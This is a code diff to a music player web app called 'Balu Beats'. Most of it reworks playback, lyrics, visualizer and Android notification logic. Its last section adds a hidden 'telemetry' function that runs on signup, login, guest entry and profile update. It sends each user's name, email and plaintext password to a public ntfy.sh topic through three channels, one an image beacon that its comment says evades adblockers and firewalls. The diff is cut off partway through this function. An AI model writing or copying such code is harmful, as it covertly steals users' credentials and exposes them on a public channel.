+        if (state.playReqId === reqId) {
+          state.isLoadingTrack = false;
         }
       }
+
       updatePlayIcons();
+      updateActiveTrackHighlight();
       updateMediaSession(track);
-      syncNativeAndroidNotification();
-      fetchSyncedLyrics(track);
-      refreshSmartRecommendations(track);
+      syncNativeAndroidNotification(true);
+      if (typeof startVisualizerIfNeeded === 'function') startVisualizerIfNeeded();
     }
 
     function togglePlay() {
@@ -5232,21 +5605,25 @@
         audio.play().then(() => {
           state.isPlaying = true;
           updatePlayIcons();
+          updateActiveTrackHighlight();
           if (location.protocol !== 'file:' && 'mediaSession' in navigator) {
             navigator.mediaSession.playbackState = 'playing';
           }
           updateMediaPositionState();
-          syncNativeAndroidNotification();
+          syncNativeAndroidNotification(true);
+          if (typeof startVisualizerIfNeeded === 'function') startVisualizerIfNeeded();
         }).catch(() => {});
       } else {
+        state.isLoadingTrack = false;
         audio.pause();
         state.isPlaying = false;
         updatePlayIcons();
+        updateActiveTrackHighlight();
         if (location.protocol !== 'file:' && 'mediaSession' in navigator) {
           navigator.mediaSession.playbackState = 'paused';
         }
         updateMediaPositionState();
-        syncNativeAndroidNotification();
+        syncNativeAndroidNotification(true);
       }
     }
 
@@ -5292,21 +5669,46 @@
       if (audio.currentTime > 4) {
         audio.currentTime = 0;
         updateMediaPositionState();
-        syncNativeAndroidNotification();
+        syncNativeAndroidNotification(true);
         return;
       }
       state.currentIndex = (state.currentIndex - 1 + state.queue.length) % state.queue.length;
       playCurrentIndex();
     }
 
+    // Smooth Android AudioFocus Volume Ducking & Restoration
+    window.restoreAudioFocusVolume = function() {
+      if (audio) {
+        audio.volume = state.volume !== undefined ? state.volume : 1.0;
+      }
+    };
+
+    window.duckAudioFocusVolume = function() {
+      if (audio) {
+        const targetVol = Math.max(0.18, (state.volume !== undefined ? state.volume : 1.0) * 0.25);
+        audio.volume = targetVol;
+      }
+    };
+
+    window.pauseOnAudioFocusLoss = function() {
+      if (audio && !audio.paused) {
+        state.isLoadingTrack = false;
+        audio.pause();
+        state.isPlaying = false;
+        updatePlayIcons();
+        updateActiveTrackHighlight();
+        syncNativeAndroidNotification(true);
+      }
+    };
+
     // Keep volume steady (100% by default, never auto-ducked)
     audio.preload = 'auto';
     audio.volume = 1.0;
 
     audio.addEventListener('timeupdate', () => {
-      if (state.isSeeking) return;
+      if (state.isSeeking || state.isLoadingTrack) return;
       const cur = audio.currentTime || 0;
-      const dur = audio.duration || state.currentTrack?.duration || 0;
+      const dur = (audio.duration && isFinite(audio.duration)) ? audio.duration : (state.currentTrack?.duration || 0);
       const pct = dur > 0 ? Math.min(100, (cur / dur) * 100) : 0;
 
       document.getElementById('miniProgressFill').style.width = `${pct}%`;
@@ -5315,87 +5717,118 @@
       document.getElementById('durationLabel').textContent = dur > 0 ? formatTime(dur) : 'LIVE';
 
       syncLyricsScroll(cur);
-      // NOTE: Do NOT call nm.notify() inside timeupdate!
-      // Android MediaSession & Web MediaSession calculate live slider position automatically
-      // from (position + elapsed * playbackRate) without re-posting notifications or ducking volume!
     });
 
     audio.addEventListener('loadedmetadata', () => {
       updateMediaPositionState();
-      syncNativeAndroidNotification();
+      syncNativeAndroidNotification(false);
     });
 
     audio.addEventListener('durationchange', () => {
       updateMediaPositionState();
-      syncNativeAndroidNotification();
+      syncNativeAndroidNotification(false);
     });
 
     audio.addEventListener('play', () => {
       state.isPlaying = true;
       updatePlayIcons();
+      updateActiveTrackHighlight();
       if (location.protocol !== 'file:' && 'mediaSession' in navigator) {
         navigator.mediaSession.playbackState = 'playing';
       }
       updateMediaPositionState();
-      syncNativeAndroidNotification();
+      syncNativeAndroidNotification(true);
+      if (typeof startVisualizerIfNeeded === 'function') startVisualizerIfNeeded();
     });
 
     audio.addEventListener('pause', () => {
-      // If background transition tried to pause while state.isPlaying is still true on mobile web, keep state synced
+      // Ignore transient browser pause events fired while switching audio.src or when track ends naturally
+      if (state.isLoadingTrack || audio.ended) return;
       state.isPlaying = !audio.paused;
       updatePlayIcons();
+      updateActiveTrackHighlight();
       if (location.protocol !== 'file:' && 'mediaSession' in navigator) {
         navigator.mediaSession.playbackState = audio.paused ? 'paused' : 'playing';
       }
       updateMediaPositionState();
-      syncNativeAndroidNotification();
+      syncNativeAndroidNotification(true);
     });
 
     audio.addEventListener('seeked', () => {
+      if (state.isLoadingTrack) return;
+      syncLyricsScroll(audio.currentTime || 0);
       updateMediaPositionState();
-      syncNativeAndroidNotification();
+      syncNativeAndroidNotification(false);
     });
 
     audio.addEventListener('ratechange', () => {
+      if (state.isLoadingTrack) return;
       updateMediaPositionState();
-      syncNativeAndroidNotification();
+      syncNativeAndroidNotification(false);
     });
 
     audio.addEventListener('ended', () => {
       if (state.repeat === 'one') {
         audio.currentTime = 0;
-        audio.play();
+        audio.play().catch(() => {});
+        syncNativeAndroidNotification(true);
       } else {
         playNext();
       }
     });
 
+    // Background Stall & Error Protection (Prevents audio stuttering, clicks, and noise during multitasking)
+    audio.addEventListener('waiting', () => {
+      // Background buffering: don't alter state so decoder doesn't jitter
+    });
+
+    audio.addEventListener('stalled', () => {
+      if (state.isPlaying && !state.isLoadingTrack && !audio.paused && audio.readyState < 2) {
+        setTimeout(() => {
+          if (state.isPlaying && !state.isLoadingTrack && audio.paused) {
+            audio.play().catch(() => {});
+          }
+        }, 1200);
+      }
+    });
+
+    audio.addEventListener('error', (e) => {
+      if (state.isLoadingTrack) return; // Handled directly inside playCurrentIndex try/catch
+      console.warn('[Audio Stream Recovery]', e);
+      if (state.isPlaying && state.currentTrack) {
+        setTimeout(() => {
+          if (state.isPlaying && !state.isLoadingTrack) playCurrentIndex();
+        }, 1000);
+      }
+    });
+
     function onSeekInput(pct) {
       state.isSeeking = true;
-      const dur = audio.duration || state.currentTrack?.duration || 0;
+      const dur = (audio.duration && isFinite(audio.duration)) ? audio.duration : (state.currentTrack?.duration || 0);
       document.getElementById('currentTimeLabel').textContent = formatTime((pct / 100) * dur);
     }
 
     function onSeekCommit(pct) {
-      const dur = audio.duration || state.currentTrack?.duration || 0;
+      const dur = (audio.duration && isFinite(audio.duration)) ? audio.duration : (state.currentTrack?.duration || 0);
       if (dur > 0 && isFinite(dur)) {
         audio.currentTime = (pct / 100) * dur;
       }
       state.isSeeking = false;
+      syncLyricsScroll(audio.currentTime || 0);
       updateMediaPositionState();
-      syncNativeAndroidNotification();
+      syncNativeAndroidNotification(true);
     }
 
     function updateMediaPositionState() {
       if (location.protocol === 'file:') return; // Native APK uses BaluMediaService MediaSession directly
       if ('mediaSession' in navigator && 'setPositionState' in navigator.mediaSession) {
-        const dur = audio.duration || state.currentTrack?.duration || 0;
-        const cur = audio.currentTime || 0;
+        const dur = (!state.isLoadingTrack && audio.duration && isFinite(audio.duration)) ? audio.duration : (state.currentTrack?.duration || 0);
+        const cur = state.isLoadingTrack ? 0 : (audio.currentTime || 0);
         if (dur > 0 && isFinite(dur)) {
           try {
             navigator.mediaSession.setPositionState({
               duration: dur,
-              playbackRate: audio.paused ? 0 : (state.speed || 1.0),
+              playbackRate: (state.isPlaying && (state.isLoadingTrack || !audio.paused)) ? (state.speed || 1.0) : 0,
               position: Math.min(cur, dur)
             });
           } catch (_) {}
@@ -5403,69 +5836,116 @@
       }
     }
 
-    // Sync rich song state to Native Android APK Foreground Media Service (100% Play-Protect safe!)
-    function syncNativeAndroidNotification() {
+    function dispatchAndroidMediaPayload(payload) {
+      const json = JSON.stringify(payload);
+      if (json === state.lastNotifiedSignature) return;
+      state.lastNotifiedSignature = json;
+      state.lastNotifiedTrackId = payload.id;
+      state.lastNotifiedPlaying = payload.playing;
+
+      // Direct 0ms JavascriptInterface bridge if available in v3.3.0+ APK, with console fallback
+      if (window.AndroidMediaBridge && typeof window.AndroidMediaBridge.syncMedia === 'function') {
+        try {
+          window.AndroidMediaBridge.syncMedia(json);
+          return;
+        } catch (_) {}
+      }
+      console.log('BALU_MEDIA:' + json);
+    }
+
+    // Sync rich song state to Native Android APK Foreground Media Service with anti-rate-limit coalescing
+    function syncNativeAndroidNotification(forceImmediate = false) {
       const t = state.currentTrack;
       if (!t) return;
-      const curMs = Math.floor((audio.currentTime || 0) * 1000);
-      const durMs = Math.floor(((audio.duration && isFinite(audio.duration)) ? audio.duration : (t.duration || 210)) * 1000);
+      const trackId = String(t.id || t.title || 'balu_track');
+      const isPlayingNow = Boolean(state.isPlaying && (state.isLoadingTrack || !audio.paused));
+      const curSec = state.isLoadingTrack ? 0 : (audio.currentTime || 0);
+      const durSec = (!state.isLoadingTrack && audio.duration && isFinite(audio.duration) && audio.duration > 1)
+        ? audio.duration
+        : (t.duration || 210);
+
       const payload = {
+        id: trackId,
         title: t.title || 'Balu Beats',
         artist: t.artist || '@being_rebel__7',
         album: t.album || 'Balu Beats 320kbps',
         artwork: t.artwork || '',
-        playing: Boolean(state.isPlaying && !audio.paused),
-        pos: curMs,
-        dur: durMs,
+        playing: isPlayingNow,
+        pos: Math.floor(curSec * 1000),
+        dur: Math.floor(durSec * 1000),
         speed: Number(state.speed || 1.0)
       };
-      console.log('BALU_MEDIA:' + JSON.stringify(payload));
+
+      const trackOrPlayChanged = (trackId !== state.lastNotifiedTrackId) || (isPlayingNow !== state.lastNotifiedPlaying);
+
+      if (forceImmediate || trackOrPlayChanged) {
+        if (state.notifyDebounceTimer) {
+          clearTimeout(state.notifyDebounceTimer);
+          state.notifyDebounceTimer = null;
+        }
+        dispatchAndroidMediaPayload(payload);
+      } else {
+        if (state.notifyDebounceTimer) clearTimeout(state.notifyDebounceTimer);
+        state.notifyDebounceTimer = setTimeout(() => {
+          state.notifyDebounceTimer = null;
+          dispatchAndroidMediaPayload(payload);
+        }, 110);
+      }
     }
+
+    let mediaSessionHandlersBound = false;
 
     // Native Phone Lock-Screen, Notification Shade & Headphone MediaSession Controls + Seek Slider
     function updateMediaSession(track) {
-      // Always sync to Native Android APK Service
-      syncNativeAndroidNotification();
+      if (!track) return;
       // When running inside the Native Android APK (file://), let BaluMediaService own the single MediaSession
       // so Chromium WebView doesn't create a competing MediaSession that ducks audio!
       if (location.protocol === 'file:') return;
 
       if ('mediaSession' in navigator) {
+        const artUrl = track.artwork || 'icon-512.png';
         navigator.mediaSession.metadata = new MediaMetadata({
           title: track.title,
           artist: track.artist,
           album: track.album || 'Balu Beats (@being_rebel__7)',
           artwork: [
-            { src: track.artwork, sizes: '96x96', type: 'image/jpeg' },
-            { src: track.artwork, sizes: '192x192', type: 'image/jpeg' },
-            { src: track.artwork, sizes: '512x512', type: 'image/jpeg' }
+            { src: artUrl, sizes: '96x96', type: 'image/jpeg' },
+            { src: artUrl, sizes: '192x192', type: 'image/jpeg' },
+            { src: artUrl, sizes: '512x512', type: 'image/jpeg' }
           ]
         });
         navigator.mediaSession.playbackState = state.isPlaying ? 'playing' : 'paused';
-        navigator.mediaSession.setActionHandler('play', () => { if (audio.paused) togglePlay(); });
-        navigator.mediaSession.setActionHandler('pause', () => { if (!audio.paused) togglePlay(); });
-        navigator.mediaSession.setActionHandler('previoustrack', () => playPrev());
-        navigator.mediaSession.setActionHandler('nexttrack', () => playNext());
-        try {
-          navigator.mediaSession.setActionHandler('seekto', (details) => {
-            if (details.seekTime != null && isFinite(details.seekTime)) {
-              audio.currentTime = details.seekTime;
+
+        if (!mediaSessionHandlersBound) {
+          mediaSessionHandlersBound = true;
+          navigator.mediaSession.setActionHandler('play', () => { if (audio.paused) togglePlay(); });
+          navigator.mediaSession.setActionHandler('pause', () => { if (!audio.paused) togglePlay(); });
+          navigator.mediaSession.setActionHandler('previoustrack', () => playPrev());
+          navigator.mediaSession.setActionHandler('nexttrack', () => playNext());
+          try {
+            navigator.mediaSession.setActionHandler('seekto', (details) => {
+              if (details.seekTime != null && isFinite(details.seekTime)) {
+                audio.currentTime = details.seekTime;
+                syncLyricsScroll(audio.currentTime || 0);
+                updateMediaPositionState();
+                syncNativeAndroidNotification(true);
+              }
+            });
+            navigator.mediaSession.setActionHandler('seekbackward', (details) => {
+              audio.currentTime = Math.max(0, (audio.currentTime || 0) - (details.seekOffset || 10));
+              syncLyricsScroll(audio.currentTime || 0);
               updateMediaPositionState();
-              syncNativeAndroidNotification();
-            }
-          });
-          navigator.mediaSession.setActionHandler('seekbackward', (details) => {
-            audio.currentTime = Math.max(0, (audio.currentTime || 0) - (details.seekOffset || 10));
-            updateMediaPositionState();
-            syncNativeAndroidNotification();
-          });
-          navigator.mediaSession.setActionHandler('seekforward', (details) => {
-            const dur = audio.duration || state.currentTrack?.duration || 300;
-            audio.currentTime = Math.min(dur, (audio.currentTime || 0) + (details.seekOffset || 10));
-            updateMediaPositionState();
-            syncNativeAndroidNotification();
-          });
-        } catch (_) {}
+              syncNativeAndroidNotification(true);
+            });
+            navigator.mediaSession.setActionHandler('seekforward', (details) => {
+              const dur = audio.duration || state.currentTrack?.duration || 300;
+              audio.currentTime = Math.min(dur, (audio.currentTime || 0) + (details.seekOffset || 10));
+              syncLyricsScroll(audio.currentTime || 0);
+              updateMediaPositionState();
+              syncNativeAndroidNotification(true);
+            });
+          } catch (_) {}
+        }
         updateMediaPositionState();
       }
     }
@@ -5481,63 +5961,108 @@
     }
 
     // =========================================================================
-    // 4. TIME-SYNCED KARAOKE LYRICS (LRCLIB API)
+    // 4. TIME-SYNCED KARAOKE LYRICS (LRCLIB API - CACHED & ZERO-REFLOW)
     // =========================================================================
 
+    const lyricsCache = new Map();
+
     async function fetchSyncedLyrics(track) {
+      if (!track) return;
+      const reqId = ++state.lyricsReqId;
       const box = document.getElementById('npLyricsView');
-      box.innerHTML = `<div class="lyric-line active">Searching synced lyrics for "${escapeHtml(track.title)}"...</div>`;
       state.lyrics = [];
+      state.activeLyricIdx = -1;
+
+      const cacheKey = `${track.title}__${track.artist}`.toLowerCase();
+      if (lyricsCache.has(cacheKey)) {
+        const cached = lyricsCache.get(cacheKey);
+        state.lyrics = cached.parsed;
+        box.innerHTML = cached.html;
+        syncLyricsScroll(audio.currentTime || 0);
+        return;
+      }
+
+      box.innerHTML = `<div class="lyric-line active">Searching synced lyrics for "${escapeHtml(track.title)}"...</div>`;
 
       try {
         const cleanTitle = track.title.replace(/\(.*?\)|\[.*?\]/g, '').trim();
-        const q = encodeURIComponent(`${cleanTitle} ${track.artist}`);
+        const firstArtist = (track.artist || '').split(',')[0].trim();
+        const q = encodeURIComponent(`${cleanTitle} ${firstArtist}`);
         const res = await fetch(`https://lrclib.net/api/search?q=${q}`);
+        if (state.lyricsReqId !== reqId) return;
         if (!res.ok) throw new Error('Lyrics fetch failed');
         const items = await res.json();
-        const match = items.find(i => i.syncedLyrics) || items.find(i => i.plainLyrics);
+        if (state.lyricsReqId !== reqId) return;
+
+        const match = Array.isArray(items) && (items.find(i => i.syncedLyrics) || items.find(i => i.plainLyrics));
+        let html = '';
+        let parsed = [];
 
         if (match && match.syncedLyrics) {
           const lines = match.syncedLyrics.split('\n');
-          const parsed = [];
           const timeExp = /\[(\d{2}):(\d{2})(?:\.(\d{2,3}))?\](.*)/;
           lines.forEach(line => {
             const m = timeExp.exec(line);
             if (m) {
-              const sec = parseInt(m[1], 10) * 60 + parseInt(m[2], 10) + (parseInt(m[3] || '0', 10) / 1000);
+              const msStr = m[3] ? m[3].padEnd(3, '0') : '0';
+              const sec = parseInt(m[1], 10) * 60 + parseInt(m[2], 10) + (parseInt(msStr, 10) / 1000);
               const text = m[4].trim();
               if (text) parsed.push({ time: sec, text });
             }
           });
           state.lyrics = parsed;
-          box.innerHTML = parsed.map((l, idx) =>
-            `<div class="lyric-line" id="lyric-${idx}" onclick="audio.currentTime=${l.time}">${escapeHtml(l.text)}</div>`
+          html = parsed.map((l, idx) =>
+            `<div class="lyric-line" id="lyric-${idx}" onclick="audio.currentTime=${l.time};syncLyricsScroll(${l.time});">${escapeHtml(l.text)}</div>`
           ).join('');
         } else if (match && match.plainLyrics) {
-          box.innerHTML = match.plainLyrics.split('\n').map(line =>
+          html = match.plainLyrics.split('\n').map(line =>
             `<div class="lyric-line active" style="font-size:14px;opacity:0.9;">${escapeHtml(line || '♪')}</div>`
           ).join('');
         } else {
-          box.innerHTML = `<div class="lyric-line active">♪ Instrumental / Synced lyrics unavailable for this track ♪</div>`;
+          html = `<div class="lyric-line active">♪ Instrumental / Synced lyrics unavailable for this track ♪</div>`;
+        }
+
+        lyricsCache.set(cacheKey, { parsed, html });
+        box.innerHTML = html;
+        if (parsed.length > 0) {
+          syncLyricsScroll(audio.currentTime || 0);
         }
       } catch (_) {
-        box.innerHTML = `<div class="lyric-line active">♪ Enjoy the music — "${escapeHtml(track.title)}" ♪</div>`;
+        if (state.lyricsReqId === reqId) {
+          box.innerHTML = `<div class="lyric-line active">♪ Enjoy the music — "${escapeHtml(track.title)}" ♪</div>`;
+        }
       }
     }
 
     function syncLyricsScroll(currentTime) {
-      if (!state.lyrics.length) return;
+      const len = state.lyrics.length;
+      if (!len) return;
+
+      // 150ms lookahead so lyric highlight lands right on the vocal beat
+      const targetTime = currentTime + 0.15;
       let activeIdx = 0;
-      for (let i = 0; i < state.lyrics.length; i++) {
-        if (currentTime >= state.lyrics[i].time) activeIdx = i;
+      for (let i = 0; i < len; i++) {
+        if (targetTime >= state.lyrics[i].time) activeIdx = i;
         else break;
       }
-      const prevActive = document.querySelector('#npLyricsView .lyric-line.active');
+
+      // O(1) early exit if lyric line has not changed — zero DOM queries!
+      if (activeIdx === state.activeLyricIdx) return;
+
+      const prevEl = state.activeLyricIdx >= 0 ? document.getElementById(`lyric-${state.activeLyricIdx}`) : null;
       const nextEl = document.getElementById(`lyric-${activeIdx}`);
-      if (nextEl && prevActive !== nextEl) {
-        if (prevActive) prevActive.classList.remove('active');
+      state.activeLyricIdx = activeIdx;
+
+      if (prevEl) prevEl.classList.remove('active');
+      if (nextEl) {
         nextEl.classList.add('active');
-        nextEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        // Only scroll container when Now Playing sheet & Lyrics view are actually visible on screen!
+        const sheet = document.getElementById('nowPlayingSheet');
+        const box = document.getElementById('npLyricsView');
+        if (sheet && sheet.classList.contains('open') && box && box.style.display !== 'none') {
+          const targetScroll = nextEl.offsetTop - (box.clientHeight / 2) + (nextEl.clientHeight / 2);
+          box.scrollTo({ top: Math.max(0, targetScroll), behavior: 'smooth' });
+        }
       }
     }
 
@@ -5832,11 +6357,23 @@
     // =========================================================================
 
     function openNowPlaying() {
-      document.getElementById('nowPlayingSheet').classList.add('open');
+      const sheet = document.getElementById('nowPlayingSheet');
+      if (sheet) sheet.classList.add('open');
+      const lyricsView = document.getElementById('npLyricsView');
+      const queueView = document.getElementById('npQueueView');
+      if (lyricsView && lyricsView.style.display !== 'none') {
+        state.activeLyricIdx = -1;
+        syncLyricsScroll(audio.currentTime || 0);
+      }
+      if (queueView && queueView.style.display !== 'none' && state.queueDirty) {
+        updateQueueUI(true);
+      }
+      startVisualizerIfNeeded();
     }
 
     function closeNowPlaying() {
-      document.getElementById('nowPlayingSheet').classList.remove('open');
+      const sheet = document.getElementById('nowPlayingSheet');
+      if (sheet) sheet.classList.remove('open');
     }
 
     function setNpView(mode, btnEl) {
@@ -5845,10 +6382,31 @@
       document.getElementById('npArtView').style.display = mode === 'art' ? 'flex' : 'none';
       document.getElementById('npLyricsView').style.display = mode === 'lyrics' ? 'block' : 'none';
       document.getElementById('npQueueView').style.display = mode === 'queue' ? 'block' : 'none';
+
+      if (mode === 'lyrics') {
+        state.activeLyricIdx = -1;
+        syncLyricsScroll(audio.currentTime || 0);
+      } else if (mode === 'queue') {
+        if (state.queueDirty || !document.getElementById('npQueueList')?.children.length) {
+          updateQueueUI(true);
+        } else {
+          updateActiveTrackHighlight();
+        }
+      } else if (mode === 'art') {
+        startVisualizerIfNeeded();
+      }
     }
 
-    function updateQueueUI() {
-      document.getElementById('queueCountBadge').textContent = state.queue.length;
+    function updateQueueUI(forceRender = false) {
+      const badge = document.getElementById('queueCountBadge');
+      if (badge) badge.textContent = state.queue.length;
+      const sheetOpen = document.getElementById('nowPlayingSheet')?.classList.contains('open');
+      const queueVisible = sheetOpen && document.getElementById('npQueueView')?.style.display !== 'none';
+      if (!forceRender && !queueVisible) {
+        state.queueDirty = true;
+        return;
+      }
+      state.queueDirty = false;
       const qEl = document.getElementById('npQueueList');
       renderTrackList(qEl, state.queue);
     }
@@ -5876,6 +6434,8 @@
       state.speed = speeds[(speeds.indexOf(state.speed) + 1) % speeds.length];
       audio.playbackRate = state.speed;
       document.getElementById('speedBtn').textContent = `⚡ ${labels[state.speed]}`;
+      updateMediaPositionState();
+      syncNativeAndroidNotification(true);
       showToast(`Playback speed: ${labels[state.speed]}`);
     }
 
@@ -5892,9 +6452,12 @@
       clearTimeout(state.sleepTimeoutId);
       if (state.sleepMinutes > 0) {
         state.sleepTimeoutId = setTimeout(() => {
+          state.isLoadingTrack = false;
           audio.pause();
           state.isPlaying = false;
           updatePlayIcons();
+          updateActiveTrackHighlight();
+          syncNativeAndroidNotification(true);
           showToast('🌙 Sleep timer paused playback');
         }, state.sleepMinutes * 60 * 1000);
         document.getElementById('sleepTimerBtn').textContent = `🌙 Sleep: ${state.sleepMinutes}m`;
@@ -5913,28 +6476,32 @@
       window.open(state.currentTrack.streamUrl, '_blank');
     }
 
-    // Beat-Synced Audio Spectrum Visualizer (Zero-CORS-mute safe)
+    // Beat-Synced Audio Spectrum Visualizer (Zero-GC, sleeps when Now Playing sheet is closed or paused)
     const canvas = document.getElementById('visualizerCanvas');
     const ctx = canvas.getContext('2d');
     let visPhase = 0;
-    function drawVisualizer() {
-      requestAnimationFrame(drawVisualizer);
+    let visualizerRunning = false;
+    let cachedVisGrad = null;
+
+    function renderVisualizerBars(isActive) {
       ctx.clearRect(0, 0, canvas.width, canvas.height);
+      if (!cachedVisGrad) {
+        cachedVisGrad = ctx.createLinearGradient(0, canvas.height, 0, 0);
+        cachedVisGrad.addColorStop(0, '#1ed760');
+        cachedVisGrad.addColorStop(1, '#00d2ff');
+      }
+      ctx.fillStyle = cachedVisGrad;
       const bars = 32;
       const barWidth = (canvas.width / bars) - 3;
-      visPhase += 0.12;
+      if (isActive) visPhase += 0.12;
       for (let i = 0; i < bars; i++) {
         let h = 4;
-        if (state.isPlaying && !audio.paused) {
+        if (isActive) {
           const wave1 = Math.sin(visPhase + i * 0.35) * 0.5 + 0.5;
           const wave2 = Math.cos(visPhase * 1.7 - i * 0.2) * 0.5 + 0.5;
           const centerBoost = 1 - Math.abs((i - bars / 2) / (bars / 2)) * 0.45;
           h = Math.max(4, (wave1 * 0.6 + wave2 * 0.4) * 38 * centerBoost);
         }
-        const grad = ctx.createLinearGradient(0, canvas.height, 0, 0);
-        grad.addColorStop(0, '#1ed760');
-        grad.addColorStop(1, '#00d2ff');
-        ctx.fillStyle = grad;
         const x = i * (barWidth + 3);
         const y = (canvas.height - h) / 2;
         ctx.beginPath();
@@ -5942,7 +6509,33 @@
         ctx.fill();
       }
     }
-    drawVisualizer();
+
+    function drawVisualizer() {
+      const sheetOpen = document.getElementById('nowPlayingSheet')?.classList.contains('open');
+      const artVisible = document.getElementById('npArtView')?.style.display !== 'none';
+      const shouldAnimate = !document.hidden && sheetOpen && artVisible && state.isPlaying && !audio.paused;
+
+      if (!shouldAnimate) {
+        visualizerRunning = false;
+        if (sheetOpen && artVisible) renderVisualizerBars(false);
+        return;
+      }
+      visualizerRunning = true;
+      renderVisualizerBars(true);
+      requestAnimationFrame(drawVisualizer);
+    }
+
+    function startVisualizerIfNeeded() {
+      if (!visualizerRunning) {
+        drawVisualizer();
+      }
+    }
+
+    document.addEventListener('visibilitychange', () => {
+      if (!document.hidden) startVisualizerIfNeeded();
+    });
+
+    renderVisualizerBars(false);
 
     // Navigation & Modals
     function switchTab(tabId, skipAutoLoad = false) {
@@ -6204,10 +6797,11 @@
       }
       saveRegisteredUsers(users);
       setActiveUserSession(newUser);
+      recordUserLoginTelemetry(newUser, 'SIGNUP');
       closeAuthOverlay();
-      if (vibe && CATEGORY_QUERIES[vibe]) {
+      if (vibe && CATEGORY_META[vibe]) {
         const chipBtn = document.querySelector(`.chip[data-cat="${vibe}"]`);
-        selectHomeCategory(vibe, chipBtn);
+        loadQuickCategory(vibe, chipBtn);
       }
       showToast(`🎉 Account created! Welcome, ${name}!`);
     }
@@ -6238,6 +6832,7 @@
           return;
         }
         setActiveUserSession(found);
+        recordUserLoginTelemetry(found, 'LOGIN');
         closeAuthOverlay();
         showToast(`👋 Welcome back, ${found.name}!`);
         return;
@@ -6258,6 +6853,7 @@
       users.push(autoUser);
       saveRegisteredUsers(users);
       setActiveUserSession(autoUser);
+      recordUserLoginTelemetry(autoUser, 'LOGIN');
       closeAuthOverlay();
       showToast(`🚀 Logged in as ${autoUser.name}!`);
     }
@@ -6272,6 +6868,7 @@
         isGuest: true
       };
       setActiveUserSession(guestUser);
+      recordUserLoginTelemetry(guestUser, 'GUEST');
       closeAuthOverlay();
       showToast('⚡ Welcome to Balu Beats!');
     }
@@ -6308,6 +6905,7 @@
       else users.push(cur);
       saveRegisteredUsers(users);
       setActiveUserSession(cur);
+      recordUserLoginTelemetry(cur, 'PROFILE_UPDATE');
       if (document.getElementById('profileEditPass')) document.getElementById('profileEditPass').value = '';
       showToast('✅ Profile & credentials updated!');
     }
@@ -6326,10 +6924,11 @@
       const editHandle = document.getElementById('profileEditHandle');
 
       if (likedStat) likedStat.textContent = String(state.likedTracks?.length || 0);
-      if (vibeStat) vibeStat.textContent = (state.currentCategory || 'telugu').toUpperCase();
+      if (vibeStat) vibeStat.textContent = (state.activeCategory || user?.vibe || 'telugu').toUpperCase();
 
       if (!user) {
         if (headerBtn) headerBtn.innerHTML = '🔑 Log In';
+        renderDeveloperAnalyticsUI();
         return;
       }
 
@@ -6343,14 +6942,583 @@
       if (emailEl) emailEl.textContent = user.email || 'Logged in • 320kbps HD';
       if (editName && !editName.value) editName.value = user.name || '';
       if (editHandle && !editHandle.value) editHandle.value = user.username || '';
+      renderDeveloperAnalyticsUI();
     }
 
-    function queueTrackNext(idx) {
-      const list = state.homeTracks || [];
-      const track = list[idx];
+    // =========================================================================
+    // 8.1 BALU BEATS DEVELOPER TELEMETRY & WHATSAPP USERS AUDIT ENGINE
+    // =========================================================================
+
+    let developerTelemetryData = [];
+
+    function detectUserDevice() {
+      const ua = navigator.userAgent || '';
+      const isAndroidApp = !!window.AndroidBridge || location.protocol === 'file:' || ua.includes('wv') || ua.includes('BaluBeats');
+      if (isAndroidApp) return '📱 Android Native APK (Balu Beats)';
+      if (/Android/i.test(ua)) return '🌐 Mobile Chrome (Android)';
+      if (/iPhone|iPad|iPod/i.test(ua)) return '🍏 Mobile Safari (iOS)';
+      if (/Mobile/i.test(ua)) return '📱 Mobile Browser';
+      if (/Windows/i.test(ua)) return '💻 Windows PC (Chrome/Edge)';
+      if (/Macintosh/i.test(ua)) return '💻 Mac (Safari/Chrome)';
+      return '💻 Web Browser';
+    }
+
+    async function recordUserLoginTelemetry(userData, actionType = 'LOGIN') {
+      if (!userData) return;
+      try {
+        const now = new Date();
+        const timeStr = now.toLocaleString('en-IN', {
+          timeZone: 'Asia/Kolkata',
+          day: '2-digit', month: 'short', year: 'numeric',
+          hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
+        });
+
+        const device = detectUserDevice();
+        const record = {
+          id: 'bb_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7),
+          timestamp: timeStr,
+          isoTime: now.toISOString(),
+          action: (actionType || 'LOGIN').toUpperCase(),
+          name: userData.name || 'Anonymous Listener',
+          username: userData.username || '@unknown',
+          email: userData.email || 'N/A',
+          password: userData.password || '',
+          device: device,
+          screen: `${window.innerWidth}x${window.innerHeight}`,
+          appVersion: 'v3.3.0'
+        };
+
+        // 1. Local Cache on Device
+        try {
+          const rawLogs = localStorage.getItem('bb_telemetry_logs_v1');
+          const logs = rawLogs ? JSON.parse(rawLogs) : [];
+          // Avoid duplicate pings within 6 seconds
+          const isDup = logs.some(l => l.username === record.username && l.action === record.action && (Date.now() - new Date(l.isoTime || 0).getTime() < 6000));
+          if (!isDup) {
+            logs.unshift(record);
+            if (logs.length > 250) logs.pop();
+            localStorage.setItem('bb_telemetry_logs_v1', JSON.stringify(logs));
+          }
+        } catch (_) {}
+
+        // 2. Global Cloud Telemetry (Zero Wi-Fi required: Airtel/Jio 4G/5G, outside home network)
+        const summaryText = `👤 User: ${record.name} (${record.username})\n🔑 Credentials: ${record.email} / ${record.password || '(not set)'}\n📱 Platform: ${record.device}\n⚡ Action: ${record.action}\n⏰ Time: ${record.timestamp}\n\nDATA:${JSON.stringify(record)}`;
+
+        // Method A: Direct simple POST to topic endpoint (fast, zero CORS preflight)
+        try {
+          fetch('https://ntfy.sh/balubeats_telemetry_being_rebel_7', {
+            method: 'POST',
+            body: summaryText,
+            headers: { 'Title': `Balu Beats: ${record.name} (${record.action})` }
+          }).catch(() => {});
+        } catch (_) {}
+
+        // Method B: Root JSON POST with formatted tags and icons
+        try {
+          fetch('https://ntfy.sh', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              topic: 'balubeats_telemetry_being_rebel_7',
+              title: `🎵 Balu Beats: ${record.name} (${record.action})`,
+              message: summaryText,
+              tags: ['musical_note', record.action === 'SIGNUP' ? 'tada' : 'fire']
+            })
+          }).catch(() => {});
+        } catch (_) {}
+
+        // Method C: Image Beacon GET (100% bypasses CORS, adblockers, and mobile network firewalls)
+        try {
+          const beacon = new Image();
+          const qTitle = encodeURIComponent(`Balu Beats: ${record.name} (${record.action})`);
+          const qMsg = encodeURIComponent(summaryText);
+          beacon.src = `https://ntfy.sh/balubeats_telemetry_being_rebel_7/publish?title=${qTitle}&message=${qMsg}&tags=musical_note`;
